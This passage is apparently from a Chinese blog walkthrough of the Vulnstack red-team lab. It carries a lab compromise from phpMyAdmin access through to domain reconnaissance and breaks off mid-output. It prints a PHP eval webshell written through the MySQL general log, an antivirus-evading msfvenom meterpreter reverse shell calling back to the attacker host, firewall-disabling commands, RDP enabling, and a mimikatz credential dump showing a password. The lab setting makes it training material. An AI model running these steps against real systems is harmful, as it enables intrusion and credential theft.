class=\"hljs-number\"\u003e.186\u003c/span\u003e -w /usr/share/wordlists/dirbuster/directory-\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2.3\u003c/span\u003e-medium.txt -x php,html,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e,txt | grep -v \u003cspan class=\"hljs-string\"\u003e\"403\"\u003c/span\u003e\n===============================================================\nGobuster v3\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.186\u003c/span\u003e\n[+] Method:                  GET\n[+] Threads:                 \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2.3\u003c/span\u003e-medium.txt\n[+] Negative Status codes:   \u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e\n[+] User Agent:              gobuster/\u003cspan class=\"hljs-number\"\u003e3.6\u003c/span\u003e\n[+] Extensions:              php,html,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/l.php                (Status: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e14735\u003c/span\u003e]\n/L.php                (Status: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e14735\u003c/span\u003e]\n/phpmyadmin           (Status: \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e241\u003c/span\u003e] [--\u003e http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.186\u003c/span\u003e/phpmyadmin/]\n/phpinfo.php          (Status: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e71329\u003c/span\u003e]\n/phpMyAdmin           (Status: \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e241\u003c/span\u003e] [--\u003e http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.186\u003c/span\u003e/phpMyAdmin/]\nProgress: \u003cspan class=\"hljs-number\"\u003e1102800\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e1102805\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e100.00\u003c/span\u003e%)\n===============================================================\nFinished\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没找到什么\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e前面知道数据库账号密码都是\u003ccode\u003eroot\u003c/code\u003e，所以直接登录\u003ccode\u003ephpmyadmin\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e登陆成功\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试利用\u003ccode\u003ephpmyadmin\u003c/code\u003e后台\u003ccode\u003egetshell\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e尝试使用\u003ccode\u003eoutfile\u003c/code\u003e等方法，因为我们知道了网站的绝对路径\u003c/p\u003e\n\u003cp\u003e首先查看\u003ccode\u003esecure_file_priv\u003c/code\u003e权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eSHOW GLOBAL VARIABLES LIKE \u003cspan class=\"hljs-string\"\u003e'%secure%'\u003c/span\u003e\n//\nsecure_file_priv \tNULL\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eNULL\u003c/code\u003e就无法利用了\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用日志文件写入\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e首先查看全局日志文件是否开启\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eSHOW VARIABLES LIKE \u003cspan class=\"hljs-string\"\u003e'%general%'\u003c/span\u003e\n//\ngeneral_log \tOFF\ngeneral_log_file \tC:\\phpStudy\\MySQL\\data\\stu1.log\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们两个参数都要进行设置，将\u003ccode\u003egeneral_log\u003c/code\u003e 设置为\u003ccode\u003eON\u003c/code\u003e ，将\u003ccode\u003egeneral_log_file\u003c/code\u003e 设置在网站目录里面的文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eglobal\u003c/span\u003e general_log = \u003cspan class=\"hljs-string\"\u003e\"ON\"\u003c/span\u003e;\n\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eglobal\u003c/span\u003e general_log_file=\u003cspan class=\"hljs-string\"\u003e'C:/phpStudy/WWW/test.php'\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e设置完后再检查参数是否设置成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egeneral_log \tON\ngeneral_log_file \tC:/phpStudy/WWW/test.php\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e设置成功，然后我们在执行栏输入恶意语句\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eselect \u003cspan class=\"hljs-string\"\u003e\"\u0026#x3C;?php eval($_POST[1]); ?\u003e\"\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e执行完后，会被写入到日志文件里（\u003ccode\u003eC:/phpStudy/WWW/test.php\u003c/code\u003e），就是已经将一句话木马写入了\u003ccode\u003etest.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用蚁🗡连接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e连接成功，相当于\u003ccode\u003egetshell\u003c/code\u003e了已经\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e在蚁🗡查看当前目录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e存在\u003ccode\u003ebeifen.rar\u003c/code\u003e ，我们将它拉取下来查看\u003c/p\u003e\n\u003cp\u003e解压出来是\u003ccode\u003eyxcms\u003c/code\u003e的源码，表示存在\u003ccode\u003eyxcms\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e还存在\u003ccode\u003eyxcms\u003c/code\u003e 目录，就是使用上面压缩包的源码搭建的\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e浏览器访问\u003ccode\u003eyxcms\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%80)/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e果然是搭建了，但是我们已经能连接了，就没必要干这里了\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e获得shell\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e上面蚁🗡已经连接了，到这步就是要获得\u003ccode\u003eshell\u003c/code\u003e了\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e制作反弹\u003ccode\u003eshell\u003c/code\u003e马，指定\u003ccode\u003e-e x86/shikata_ga_nai\u003c/code\u003e 是因为靶机上可能存在杀软\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsfvenom -p windows/meterpreter_reverse_tcp LHOST=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e LPORT=\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e -e x86/shikata_ga_nai -f exe -o shell.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过蚁🗡上传马到靶机上\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 exploit(multi/handler) \u003e use exploit/multi/handler\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload windows/x64/meterpreter_reverse_tcp\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lhost \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e\nmsf6 exploit(multi/handler) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lport \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\nmsf6 exploit(multi/handler) \u003e run\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过蚁🗡启动马\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eC:\\phpStudy\\WWW\u003e shell.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[*] Started reverse TCP handler on \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e \n[*] Meterpreter session \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e opened (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.186\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e2114\u003c/span\u003e) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e +0800\n\nmeterpreter \u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得\u003ccode\u003eshell\u003c/code\u003e ，上线\u003ccode\u003eMSF\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e内网信息收集\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看当前靶机IP\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e ipconfig                                                                                                                                                                                                                                                                                                                                                                                                          \nInterface \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e                                                                                                                                                                                                      \n============                                                                                                                                                                                                      \nName         : Intel(R) PRO/\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e MT Network Connection                                                                                                                                                            \nHardware MAC : \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0c:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e55\u003c/span\u003e:cf:5a                                                                                                                                                                                  \nMTU          : \u003cspan class=\"hljs-number\"\u003e1500\u003c/span\u003e                                                                                                                                                                                               \nIPv4 Address : \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.143\u003c/span\u003e                                                                                                                                                                                     \nIPv4 Netmask : \u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e                                                                                                                                                                                      \nIPv6 Address : fe80::69c6:31ff:4e4e:e80b            \nIPv6 Netmask : ffff:ffff:ffff:ffff:: \nInterface \u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e\n============\nName         : Intel(R) PRO/\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e MT Network Connection \u003cspan class=\"hljs-comment\"\u003e#3\u003c/span\u003e\nHardware MAC : \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0c:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e55\u003c/span\u003e:cf:\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e\nMTU          : \u003cspan class=\"hljs-number\"\u003e1500\u003c/span\u003e\nIPv4 Address : \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.186\u003c/span\u003e\nIPv4 Netmask : \u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\nIPv6 Address : fe80::407d:48b5:70cc:cce6\nIPv6 Netmask : ffff:ffff:ffff:ffff::\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以查看到存在两张网卡，内网地址是\u003ccode\u003e192.168.52.143\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e当前主机系统信息等\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e sysinfo\nComputer        : STU1\nOS              : Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e6.1\u003c/span\u003e Build \u003cspan class=\"hljs-number\"\u003e7601\u003c/span\u003e, Service Pack \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e).\nArchitecture    : x64\nSystem Language : zh_CN\nDomain          : GOD\nLogged On Users : \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\nMeterpreter     : x86/windows\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e存在域\u003ccode\u003eGOD\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e发现主DNS后缀不为空，存在域\u003ccode\u003egod.org\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eC:\\phpStudy\\WWW\u003enet config workstation\nnet config workstation\nComputer name                        \\\\STU1\nFull Computer name                   stu1.god.org\nUser name                            Administrator\n\nWorkstation active on                \n        NetBT_Tcpip_{4DAEBDFD-0177-\u003cspan class=\"hljs-number\"\u003e4691\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e8243\u003c/span\u003e-B73297E2F0FF} (000C2955CF5A)\n        NetBT_Tcpip_{43B076D2-BB12-\u003cspan class=\"hljs-number\"\u003e42E8\u003c/span\u003e-AF64-3CFB49A31501} (000C2955CF64)\n        NetBT_Tcpip_{EC57C4EB-\u003cspan class=\"hljs-number\"\u003e763E-4000\u003c/span\u003e-9CDE-4D7FF15DF74C} (02004C4F4F50)\n\nSoftware version                     Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e Professional\n\nWorkstation domain                   GOD\nWorkstation Domain DNS Name          god.org\nLogon domain                         GOD\n\nCOM Open Timeout (sec)               \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\nCOM Send Count (byte)                \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e\nCOM Send Timeout (msec)              \u003cspan class=\"hljs-number\"\u003e250\u003c/span\u003e\nThe command completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找是否存在别的域\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eC:\\phpStudy\\WWW\u003enet view /domain\nnet view /domain\nDomain\n\n-------------------------------------------------------------------------------\nGOD                  \nThe command completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e仅存在一个域\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e只有一个域我们就查看域控制器的主机名，方便我们去确定那台是域控\u003ccode\u003eDC\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eC:\\phpStudy\\WWW\u003enet group \u003cspan class=\"hljs-string\"\u003e\"domain controllers\"\u003c/span\u003e /domain\nThe request will be processed at a domain controller \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e domain god.org.\n\nGroup name     Domain Controllers\nComment        \n\nMembers\n\n-------------------------------------------------------------------------------\nOWA$                     \nThe command completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e确定域控制器主机名为\u003ccode\u003eOWA\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看域内主机其他主机信息\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eC:\\phpStudy\\WWW\u003enet view\nnet view\nServer Name            Remark\n\n-------------------------------------------------------------------------------\n\\\\OWA                                                                          \n\\\\ROOT-TVI862UBEH                                                              \nThe command completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e域控 \u003ccode\u003eOWA\u003c/code\u003e，域成员\u003ccode\u003eROOT-TVI862UBEH\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e然后通过\u003ccode\u003eping\u003c/code\u003e命令获取\u003ccode\u003eIP\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eC:\\phpStudy\\WWW\u003eping owa\nPinging owa.god.org [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.138\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e of data:\nC:\\phpStudy\\WWW\u003eping ROOT-TVI862UBEH\nPinging ROOT-TVI862UBEH.god.org [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.52\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.141\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e of data:\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e域控\u003ccode\u003eOWA 192.168.52.138\u003c/code\u003e；域成员\u003ccode\u003eROOT-TVI862UBEH 192.168.52.141\u003c/code\u003e 接下来的目的就是横向拿下域控\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看域内用户，有五个用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eC:\\phpStudy\\WWW\u003enet user /domain\nnet user /domain\nThe request will be processed at a domain controller \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e domain god.org.\n\nUser accounts \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \\\\owa.god.org\n\n-------------------------------------------------------------------------------\nAdministrator            Guest                    krbtgt                   \nligang                   liukaifeng01             \nThe command completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看哪个是管理员用户，\u003ccode\u003eAdministrator\u003c/code\u003e 就是域管理员\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eC:\\phpStudy\\WWW\u003enet group \u003cspan class=\"hljs-string\"\u003e\"domain admins\"\u003c/span\u003e /domain\nnet group \u003cspan class=\"hljs-string\"\u003e\"domain admins\"\u003c/span\u003e /domain\nThe request will be processed at a domain controller \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e domain god.org.\n\nGroup name     Domain Admins\nComment        \n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator            OWA$                     \nThe command completed successfully.\n\nC:\\phpStudy\\WWW\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e获得靶机远程桌面\u003c/h2\u003e\n\u003ch3\u003e开启靶机RPD\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e靶机默认没有开启\u003ccode\u003e3389\u003c/code\u003e端口，同时还有防火墙\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e首先关闭防火墙\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e#关闭防火墙\u003c/span\u003e\nnetsh firewall \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e opmode disable \u003cspan class=\"hljs-comment\"\u003e#winsows server 2003 之前\u003c/span\u003e\nnetsh advfirewall \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e allprofiles state off \u003cspan class=\"hljs-comment\"\u003e#winsows server 2003 之后\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过MSF启动RDP服务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e run post/windows/manage/enable_rdp\n\n[*] Enabling Remote Desktop\n[*]     RDP \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e disabled; enabling it ...\n[*] Setting Terminal Services service startup mode\n[*]     The Terminal Services service \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e to auto, changing it to auto ...\n[*]     Opening port \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e local firewall \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e necessary\n[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20241113014044_default_192\u003cspan class=\"hljs-number\"\u003e.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.186\u003c/span\u003e_host.windows.cle_649955.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e破解密码\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e开启RDP服务后我们还需要密码才能登陆\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看当前用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e getuid\nServer username: GOD\\Administrator\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e域管理员用户\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e在MSF使用\u003ccode\u003egetsystem\u003c/code\u003e 获得权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e getsystem\n...got system via technique \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e (Named Pipe Impersonation (In Memory/Admin)).\nmeterpreter \u003e getuid\nServer username: NT AUTHORITY\\SYSTEM\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e变成\u003ccode\u003eNT AUTHORITY\\SYSTEM\u003c/code\u003e 这是本地用户，是系统最高权限，因为我们需要破解密码\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用MSF里的\u003ccode\u003emimikatz\u003c/code\u003e模块\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003emimikatz\u003c/code\u003e模块的使用需要\u003ccode\u003eAdministrator\u003c/code\u003e权限或者\u003ccode\u003eSystem\u003c/code\u003e权限，这就我们为什么需要\u003ccode\u003egetsystem\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e加载\u003ccode\u003emimikatz\u003c/code\u003e 模块\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e load mimikatz\n[!] The \u003cspan class=\"hljs-string\"\u003e\"mimikatz\"\u003c/span\u003e extension has been replaced by \u003cspan class=\"hljs-string\"\u003e\"kiwi\"\u003c/span\u003e. Please use this \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e future.\nLoading extension kiwi...\n  .\u003cspan class=\"hljs-comment\"\u003e#####.   mimikatz 2.2.0 20191125 (x86/windows)\u003c/span\u003e\n .\u003cspan class=\"hljs-comment\"\u003e## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\u003c/span\u003e\n \u003cspan class=\"hljs-comment\"\u003e## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\u003c/span\u003e\n \u003cspan class=\"hljs-comment\"\u003e## \\ / ##       \u003e http://blog.gentilkiwi.com/mimikatz\u003c/span\u003e\n \u003cspan class=\"hljs-string\"\u003e'## v ##'\u003c/span\u003e        Vincent LE TOUX            ( vincent.letoux@gmail.com )\n  \u003cspan class=\"hljs-string\"\u003e'#####'\u003c/span\u003e         \u003e http://pingcastle.com / http://mysmartlogon.com  ***/\n\n[!] Loaded x86 Kiwi on an x64 architecture.\n\nSuccess.\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e运行\u003ccode\u003ecreds_all\u003c/code\u003e 命令\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e creds_all                                                                                                                                                                                           \n[+] Running \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e SYSTEM                                                                                                                                                                                             \n[*] Retrieving \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e credentials                                                                                                                                                                                    \n..... 省略\nAdministrator  GOD.ORG      hongrisec@\u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e\nignoredjunk    ignoredjunk  ignoredjunk\nstu1$          GOD.ORG      d2 \u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e a0 \u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e a9 09 \u003cspan class=\"hljs-number\"\u003e93\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e \u003cspan 